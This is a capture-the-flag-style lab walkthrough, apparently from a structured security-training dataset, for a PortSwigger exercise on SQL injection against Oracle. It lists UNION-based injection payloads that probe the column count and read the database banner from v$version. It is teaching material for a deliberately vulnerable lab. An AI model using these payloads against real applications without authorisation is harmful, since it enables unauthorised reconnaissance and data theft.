## SQL injection attack, querying the database type and version on Oracle

**Category:** sqli
**Difficulty:** Easy

### Description
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

### Solution Steps
1. Identify injection point in the category parameter
2. On Oracle, every SELECT must include FROM - use the dual table
3. Determine number of columns: `'+UNION+SELECT+NULL,NULL+FROM+dual--`
4. Confirm columns accept strings: `'+UNION+SELECT+'abc','def'+FROM+dual--`
5. Oracle stores version info in v$version view
6. Query the database banner:
7. `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
8. The response will contain Oracle version information like:
9. "Oracle Database 11g Express Edition Release 11.2.0.2.0"
10. This reveals the exact database type and version for further exploitation

### Key Payloads
- `dual`
- `v$version`
- `BANNER`
- `category`
- `'+UNION+SELECT+NULL,NULL+FROM+dual--`
- `'+UNION+SELECT+'abc','def'+FROM+dual--`
- `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

### Indicators of Success
- UNION SELECT FROM dual works
- v$version query returns data
- Oracle version string visible in response
- Database type confirmed as Oracle
- Version number extracted (e.g., 11g, 12c, 19c)

---
*Source: PortSwigger Web Security Academy*
